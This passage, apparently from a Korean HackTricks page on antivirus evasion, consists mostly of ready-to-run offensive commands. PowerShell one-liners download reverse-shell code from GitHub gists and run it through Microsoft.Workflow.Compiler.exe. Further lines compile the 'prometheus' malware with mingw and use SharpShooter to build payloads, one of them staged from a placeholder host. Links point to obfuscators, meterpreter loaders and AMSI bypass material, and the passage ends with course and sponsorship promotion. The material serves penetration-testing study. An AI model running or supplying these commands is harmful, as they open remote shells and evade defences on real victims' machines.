powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 파이썬을 사용한 인젝터 빌드 예제:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 더 알아보기

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
